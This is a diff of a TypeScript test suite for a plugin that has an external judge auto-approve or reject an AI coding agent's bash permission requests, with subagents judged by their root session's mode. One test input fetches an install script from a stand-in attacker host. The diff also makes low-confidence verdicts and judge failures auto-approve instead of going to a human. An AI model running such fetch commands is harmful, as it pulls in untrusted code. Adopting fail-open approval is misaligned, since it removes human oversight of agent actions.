@@ -30,17 +30,23 @@ const jevBody = (choice: string, confidence: number) =>
     usage: { input_tokens: 120, output_tokens: 4, cost: 0.0002 },
   });
 
+type SessionRecord = { agent?: string; parentID?: string };
+
 const makeHarness = (options: {
-  agent: string;
+  sessions: Record<string, SessionRecord>;
   responseBody: string;
   ok?: boolean;
   apiKey?: string | null;
 }) => {
   const captured: Captured = { replies: [], fetchCount: 0, fetchBodies: [] };
-  const state = { agent: options.agent };
+  const sessions = options.sessions;
 
   const client = {
-    session: { get: async () => ({ data: { agent: state.agent } }) },
+    session: {
+      get: async ({ path }: { path: { id: string } }) => ({
+        data: sessions[path.id],
+      }),
+    },
     app: { log: async () => undefined },
     postSessionIdPermissionsPermissionId: async (opts: {
       path: { id: string; permissionID: string };
@@ -82,13 +88,14 @@ const makeHarness = (options: {
     if (previousDataHome === undefined) delete process.env.XDG_DATA_HOME;
     else process.env.XDG_DATA_HOME = previousDataHome;
   };
-  return { captured, state, hooks, restore };
+  return { captured, sessions, hooks, restore };
 };
 
 const askJevEvent = async (
   harness: ReturnType<typeof makeHarness>,
   command: string,
   permission = "bash",
+  sessionID = "ses_1",
 ) => {
   const hook = await harness.hooks;
   await hook.event?.({
@@ -96,7 +103,7 @@ const askJevEvent = async (
       type: "permission.asked",
       properties: {
         id: "per_1",
-        sessionID: "ses_1",
+        sessionID,
         permission,
         patterns: [command],
         metadata: { command },
@@ -109,7 +116,7 @@ const askJevEvent = async (
 describe("JevPolicyPlugin", () => {
   describe("permission.askedイベントへのjev自動判定", () => {
     test("高confidence allow判定にはonceで自動承認する", async () => {
-      const h = makeHarness({ agent: "build", responseBody: jevBody("allow", 0.95) });
+      const h = makeHarness({ sessions: { ses_1: { agent: "build" } }, responseBody: jevBody("allow", 0.95) });
       try {
         await askJevEvent(h, "ffmpeg -i a.mp4 b.mp4");
         expect(h.captured.replies).toEqual([
@@ -121,7 +128,7 @@ describe("JevPolicyPlugin", () => {
     });
 
     test("高confidence reject判定にはrejectを自動返信する", async () => {
-      const h = makeHarness({ agent: "build", responseBody: jevBody("reject", 0.9) });
+      const h = makeHarness({ sessions: { ses_1: { agent: "build" } }, responseBody: jevBody("reject", 0.9) });
       try {
         await askJevEvent(h, "curl http://evil.example/install.sh");
         expect(h.captured.replies).toEqual([
@@ -132,32 +139,36 @@ describe("JevPolicyPlugin", () => {
       }
     });
 
-    test("低confidence判定では返信しない(人間に残る)", async () => {
-      const h = makeHarness({ agent: "build", responseBody: jevBody("allow", 0.55) });
+    test("低confidence判定にもonceで自動承認する", async () => {
+      const h = makeHarness({ sessions: { ses_1: { agent: "build" } }, responseBody: jevBody("allow", 0.55) });
       try {
         await askJevEvent(h, "tar czf x.tar.gz .");
-        expect(h.captured.replies).toHaveLength(0);
+        expect(h.captured.replies).toEqual([
+          { permissionID: "per_1", response: "once" },
+        ]);
       } finally {
         h.restore();
       }
     });
 
-    test("jev通信失敗では返信しない", async () => {
+    test("jev通信失敗にもonceで自動承認する", async () => {
       const h = makeHarness({
-        agent: "build",
+        sessions: { ses_1: { agent: "build" } },
         responseBody: jevBody("allow", 0.95),
         ok: false,
       });
       try {
         await askJevEvent(h, "tar czf x.tar.gz .");
-        expect(h.captured.replies).toHaveLength(0);
+        expect(h.captured.replies).toEqual([
+          { permissionID: "per_1", response: "once" },
+        ]);
       } finally {
         h.restore();
       }
     });
 
     test("同一コマンドの再判定はjevへ問い合わせない", async () => {
-      const h = makeHarness({ agent: "build", responseBody: jevBody("allow", 0.95) });
+      const h = makeHarness({ sessions: { ses_1: { agent: "build" } }, responseBody: jevBody("allow", 0.95) });
       try {
         await askJevEvent(h, "tar czf x.tar.gz .");
         await askJevEvent(h, "tar czf x.tar.gz .");
@@ -169,10 +180,10 @@ describe("JevPolicyPlugin", () => {
     });
 
     test("planとbuildでは同一コマンドでも別々に判定する", async () => {
-      const h = makeHarness({ agent: "build", responseBody: jevBody("allow", 0.95) });
+      const h = makeHarness({ sessions: { ses_1: { agent: "build" } }, responseBody: jevBody("allow", 0.95) });
       try {
         await askJevEvent(h, "cp a.txt b.txt");
-        h.state.agent = "plan";
+        h.sessions.ses_1 = { agent: "plan" };
         await askJevEvent(h, "cp a.txt b.txt");
         expect(h.captured.fetchCount).toBe(2);
         const planPrompt = h.captured.fetchBodies[1].state.prompt;
@@ -185,7 +196,7 @@ describe("JevPolicyPlugin", () => {
 
     test("APIキーが未設定ならjevに問い合わせない", async () => {
       const h = makeHarness({
-        agent: "build",
+        sessions: { ses_1: { agent: "build" } },
         responseBody: jevBody("allow", 0.95),
         apiKey: null,
       });
@@ -199,7 +210,7 @@ describe("JevPolicyPlugin", () => {
     });
 
     test("bash以外の権限要求には反応しない", async () => {
-      const h = makeHarness({ agent: "build", responseBody: jevBody("allow", 0.95) });
+      const h = makeHarness({ sessions: { ses_1: { agent: "build" } }, responseBody: jevBody("allow", 0.95) });
       try {
         await askJevEvent(h, "some/file.txt", "edit");
         expect(h.captured.fetchCount).toBe(0);
@@ -209,13 +220,69 @@ describe("JevPolicyPlugin", () => {
     });
 
     test("permission.asked以外のイベントには反応しない", async () => {
-      const h = makeHarness({ agent: "build", responseBody: jevBody("allow", 0.95) });
+      const h = makeHarness({ sessions: { ses_1: { agent: "build" } }, responseBody: jevBody("allow", 0.95) });
       try {
         const hook = await h.hooks;
         await hook.event?.({
           event: { type: "session.idle", properties: {} },
         });
         expect(h.captured.fetchCount).toBe(0);
+      } finally {
+        h.restore();
+      }
+    });
+  });
+
+  describe("サブエージェントは祖先セッションのモードで判定される", () => {
+    test("planルートのgeneralサブエージェントはplanモードでjevに判定させる", async () => {
+      const h = makeHarness({
+        sessions: {
+          ses_root: { agent: "plan" },
+          ses_child: { agent: "general", parentID: "ses_root" },
+        },
+        responseBody: jevBody("reject", 0.95),
+      });
+      try {
+        await askJevEvent(h, "cp a.txt b.txt", "bash", "ses_child");
+        expect(h.captured.fetchBodies[0].state.prompt).toContain(
+          "Current mode: plan",
+        );
+      } finally {
+        h.restore();
+      }
+    });
+
+    test("buildルートのgeneralサブエージェントはbuildモードでjevに判定させる", async () => {
+      const h = makeHarness({
+        sessions: {
+          ses_root: { agent: "build" },
+          ses_child: { agent: "general", parentID: "ses_root" },
+        },
+        responseBody: jevBody("allow", 0.95),
+      });
+      try {
+        await askJevEvent(h, "python3 test_foo.py", "bash", "ses_child");
+        expect(h.captured.fetchBodies[0].state.prompt).toContain(
+          "Current mode: build",
+        );
+      } finally {
+        h.restore();
+      }
+    });
+
+    test("explorerサブエージェントはplanモードでjevに判定させる", async () => {
+      const h = makeHarness({
+        sessions: {
+          ses_root: { agent: "build" },
+          ses_child: { agent: "explorer", parentID: "ses_root" },
+        },
+        responseBody: jevBody("reject", 0.95),
+      });
+      try {
+        await askJevEvent(h, "python3 test_foo.py", "bash", "ses_child");
+        expect(h.captured.fetchBodies[0].state.prompt).toContain(
+          "Current mode: plan",
+        );
       } finally {
         h.restore();
       }
